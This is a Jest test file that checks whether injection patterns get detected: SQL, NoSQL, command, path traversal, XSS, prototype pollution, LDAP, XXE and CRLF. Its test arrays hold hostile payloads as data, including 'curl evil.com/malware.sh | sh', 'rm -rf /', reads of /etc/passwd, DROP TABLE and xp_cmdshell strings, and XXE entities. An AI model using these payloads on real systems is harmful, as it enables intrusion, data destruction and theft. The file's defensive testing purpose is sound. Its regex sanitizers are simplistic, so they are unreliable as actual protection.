/**
 * Injection Prevention Edge Case Tests
 *
 * CRITICAL: Tests SQL injection, NoSQL injection, command injection, and other injection attacks.
 *
 * Why These Tests Matter:
 * - 🔒 Injection attacks are #1 OWASP web application security risk
 * - 💥 Can lead to data breaches, data corruption, or system compromise
 * - 🛡️ Parameterized queries and input validation are critical defenses
 * - 🐛 Vector embeddings and JSON structures need special sanitization
 *
 * Security Context:
 * - SQL injection: Manipulating database queries via user input
 * - NoSQL injection: Exploiting NoSQL query syntax (MongoDB-style)
 * - Command injection: Executing shell commands via user input
 * - XSS: Injecting JavaScript into responses (stored/reflected)
 * - Path traversal: Accessing files outside intended directory
 *
 * Priority: CRITICAL (Security risk - data breach potential)
 */

import { describe, it, expect } from '@jest/globals';

describe('Injection Prevention Edge Cases', () => {
  describe('SQL Injection Attempts', () => {
    it('should detect classic SQL injection patterns', () => {
      const maliciousInputs = [
        "' OR '1'='1",
        "'; DROP TABLE products; --",
        "admin'--",
        "1' UNION SELECT NULL, NULL, NULL--",
        "'; EXEC xp_cmdshell('dir'); --",
      ];

      maliciousInputs.forEach((input) => {
        // Test: Should detect SQL keywords and special characters
        const hasSQLKeywords = /\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b/i.test(input);
        const hasSQLChars = /['";]|--|\|\/\*/.test(input);

        // At least one detection method should flag this
        expect(hasSQLKeywords || hasSQLChars).toBe(true);
      });
    });

    it('should detect blind SQL injection attempts', () => {
      const blindInjections = [
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
      ];

      blindInjections.forEach((input) => {
        const hasTimingAttack = /SLEEP|WAITFOR|BENCHMARK/i.test(input);
        const hasSubquery = /\(SELECT .* FROM/i.test(input);

        expect(hasTimingAttack || hasSubquery).toBe(true);
      });
    });

    it('should validate parameterized query patterns', () => {
      // Good practice: Using parameterized queries
      const parameterized = {
        query: 'SELECT * FROM products WHERE id = $1 AND category = $2',
        params: [123, 'electronics'],
      };

      // Should not contain direct string concatenation
      expect(parameterized.query).not.toMatch(/\+ .* \+/);
      expect(parameterized.query).toContain('$1');
      expect(parameterized.params.length).toBe(2);
    });
  });

  describe('NoSQL Injection Attempts', () => {
    it('should detect MongoDB-style injection in filters', () => {
      const maliciousFilter = {
        email: { $ne: null }, // Returns all records
      };

      // Should detect MongoDB operators
      const filterString = JSON.stringify(maliciousFilter);
      const hasMongoOperator = /\$ne|\$gt|\$lt|\$or|\$and|\$where/.test(filterString);

      expect(hasMongoOperator).toBe(true);
    });

    it('should detect $where clause injection', () => {
      const injection = {
        $where: 'this.password == "leaked"',
      };

      const hasWhereClause = JSON.stringify(injection).includes('$where');
      expect(hasWhereClause).toBe(true);
    });

    it('should validate safe filter patterns', () => {
      // Safe: Simple equality checks with validated types
      const safeFilter = {
        email: 'user@example.com',
        status: 'active',
      };

      const filterString = JSON.stringify(safeFilter);

      // Should NOT contain MongoDB operators
      expect(filterString).not.toMatch(/\$/);
    });

    it('should detect JavaScript injection in NoSQL', () => {
      const malicious = {
        $where: "function() { return this.username == 'admin'; }",
      };

      const containsFunction = /function\s*\(/.test(JSON.stringify(malicious));
      expect(containsFunction).toBe(true);
    });
  });

  describe('Command Injection Attempts', () => {
    it('should detect shell command injection patterns', () => {
      const maliciousCommands = [
        'example.com; rm -rf /',
        'example.com | cat /etc/passwd',
        'example.com && curl evil.com/malware.sh | sh',
        'example.com`whoami`',
        '$(curl evil.com)',
      ];

      maliciousCommands.forEach((input) => {
        // Detect shell metacharacters
        const hasShellChars = /[;&|`$(){}]/.test(input);
        expect(hasShellChars).toBe(true);
      });
    });

    it('should detect command chaining attempts', () => {
      const chainedCommands = [
        'file.txt; cat /etc/passwd',
        'file.txt && echo hacked',
        'file.txt || echo fallback',
      ];

      chainedCommands.forEach((input) => {
        const hasChaining = /;\s*\w+|&&|\|\|/.test(input);
        expect(hasChaining).toBe(true);
      });
    });

    it('should validate safe domain names', () => {
      const safeDomains = [
        'example.com',
        'sub.example.com',
        'example-shop.com',
      ];

      safeDomains.forEach((domain) => {
        // Should only contain alphanumeric, dots, and hyphens
        const isSafe = /^[a-zA-Z0-9.-]+$/.test(domain);
        expect(isSafe).toBe(true);

        // Should NOT contain shell metacharacters
        const hasShellChars = /[;&|`$(){}]/.test(domain);
        expect(hasShellChars).toBe(false);
      });
    });
  });

  describe('Path Traversal Attempts', () => {
    it('should detect directory traversal patterns', () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'file:///../etc/hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f',  // URL encoded ../..
      ];

      traversalAttempts.forEach((input) => {
        const hasTraversal = /\.\.+[\/\\]|%2e|%5c/i.test(input);
        expect(hasTraversal).toBe(true);
      });
    });

    it('should detect absolute path attempts', () => {
      const absolutePaths = [
        '/etc/passwd',
        'C:\\Windows\\System32',
        'file:///etc/passwd',
      ];

      absolutePaths.forEach((input) => {
        const isAbsolute = /^[A-Z]:\\|^\/|^file:/i.test(input);
        expect(isAbsolute).toBe(true);
      });
    });

    it('should validate safe relative paths', () => {
      const safePaths = [
        'documents/file.pdf',
        'images/photo.jpg',
        'products/product-123.json',
      ];

      safePaths.forEach((path) => {
        // Should not start with / or contain ../
        const isSafe = !/^\/|\.\./.test(path);
        expect(isSafe).toBe(true);
      });
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    it('should detect script tag injection', () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
      ];

      xssAttempts.forEach((input) => {
        const hasScriptTag = /<script|<img|<svg|javascript:/i.test(input);
        expect(hasScriptTag).toBe(true);
      });
    });

    it('should detect event handler injection', () => {
      const eventHandlers = [
        'onerror=alert(1)',
        'onload=fetch("evil.com")',
        'onclick=doEvil()',
        'onmouseover=alert(1)',
      ];

      eventHandlers.forEach((input) => {
        const hasEventHandler = /on\w+\s*=/i.test(input);
        expect(hasEventHandler).toBe(true);
      });
    });

    it('should sanitize HTML input properly', () => {
      const userInput = '<script>alert("xss")</script>Normal text';

      // Sanitization function (example)
      const sanitize = (input: string) => {
        return input
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/<[^>]+>/g, '');
      };

      const sanitized = sanitize(userInput);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toBe('Normal text');
    });

    it('should detect encoded XSS attempts', () => {
      const encodedXSS = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
        '&#60;script&#62;',
      ];

      encodedXSS.forEach((input) => {
        // Decode and check
        const decoded = input
          .replace(/&lt;/g, '<')
          .replace(/&gt;/g, '>')
          .replace(/%3C/gi, '<')
          .replace(/%3E/gi, '>')
          .replace(/&#60;/g, '<')
          .replace(/&#62;/g, '>');

        const hasScript = /<script/i.test(decoded);
        expect(hasScript).toBe(true);
      });
    });
  });

  describe('JSON Injection', () => {
    it('should detect JSON structure manipulation', () => {
      const maliciousJSON = '{"name": "test", "admin": true}';

      const parsed = JSON.parse(maliciousJSON);

      // Should detect unexpected fields
      expect(parsed).toHaveProperty('admin');

      // Validation function should reject unexpected fields
      const allowedFields = ['name', 'email', 'phone'];
      const hasUnexpectedFields = Object.keys(parsed).some(
        (key) => !allowedFields.includes(key)
      );

      expect(hasUnexpectedFields).toBe(true);
    });

    it('should detect prototype pollution attempts', () => {
      const malicious = {
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
      };

      const jsonStr = JSON.stringify(malicious);

      // Should detect dangerous keys
      const hasDangerousKeys = /__proto__|constructor|prototype/.test(jsonStr);
      expect(hasDangerousKeys).toBe(true);
    });

    it('should validate JSON structure safely', () => {
      const userInput = '{"name": "test", "__proto__": {"polluted": true}}';

      try {
        const parsed = JSON.parse(userInput);

        // Should filter out dangerous keys
        const safeParse = (obj: any) => {
          const dangerous = ['__proto__', 'constructor', 'prototype'];
          Object.keys(obj).forEach((key) => {
            if (dangerous.includes(key)) {
              delete obj[key];
            }
          });
          return obj;
        };

        const safe = safeParse(parsed);
        expect(safe).not.toHaveProperty('__proto__');
        expect(safe).toHaveProperty('name');
      } catch (error) {
        // JSON parse errors are acceptable for malformed input
        expect(error).toBeTruthy();
      }
    });
  });

  describe('LDAP Injection', () => {
    it('should detect LDAP injection patterns', () => {
      const ldapInjections = [
        'admin)(&(password=*))',
        '*)(&(objectClass=*)',
        '*)(uid=*))(&(uid=*',
      ];

      ldapInjections.forEach((input) => {
        const hasLDAPChars = /[()&|*]/.test(input);
        expect(hasLDAPChars).toBe(true);
      });
    });
  });

  describe('XML Injection (XXE)', () => {
    it('should detect external entity references', () => {
      const xxeAttempts = [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY xxe SYSTEM "http://evil.com/malware">',
      ];

      xxeAttempts.forEach((input) => {
        const hasEntity = /<!ENTITY|SYSTEM|PUBLIC/.test(input);
        expect(hasEntity).toBe(true);
      });
    });
  });

  describe('Header Injection', () => {
    it('should detect CRLF injection in headers', () => {
      const crlfInjections = [
        'value\r\nX-Injected: true',
        'value\nSet-Cookie: admin=true',
        'value\r\n\r\n<script>alert(1)</script>',
      ];

      crlfInjections.forEach((input) => {
        const hasCRLF = /\r|\n/.test(input);
        expect(hasCRLF).toBe(true);
      });
    });
  });

  describe('Real-World Application Tests', () => {
    it('should sanitize product search queries', () => {
      const maliciousQueries = [
        "pump'; DROP TABLE products; --",
        "'; UNION SELECT * FROM users--",
        "<script>alert('xss')</script>",
      ];

      const sanitize = (query: string) => {
        // Remove SQL keywords, HTML tags, and special chars
        return query
          .replace(/<[^>]+>/g, '')
          .replace(/['"`;\\]/g, '')
          .replace(/\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC)\b/gi, '')
          .trim();
      };

      maliciousQueries.forEach((query) => {
        const sanitized = sanitize(query);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain(';');
      });
    });

    it('should validate domain names in customer configs', () => {
      const domains = [
        { input: 'example.com', expected: true },
        { input: 'sub.example.com', expected: true },
        { input: 'example.com; rm -rf /', expected: false },
        { input: '$(curl evil.com)', expected: false },
      ];

      const isValidDomain = (domain: string) => {
        return /^[a-zA-Z0-9.-]+$/.test(domain) && !/[;&|`$()]/.test(domain);
      };

      domains.forEach(({ input, expected }) => {
        expect(isValidDomain(input)).toBe(expected);
      });
    });

    it('should validate email addresses against injection', () => {
      const emails = [
        { input: 'user@example.com', expected: true },
        { input: "user'; DROP TABLE--@example.com", expected: false },
        { input: 'user\r\nCc: hacker@evil.com', expected: false },
      ];

      const isValidEmail = (email: string) => {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) && !/['";\r\n\\]/.test(email);
      };

      emails.forEach(({ input, expected }) => {
        expect(isValidEmail(input)).toBe(expected);
      });
    });
  });
});
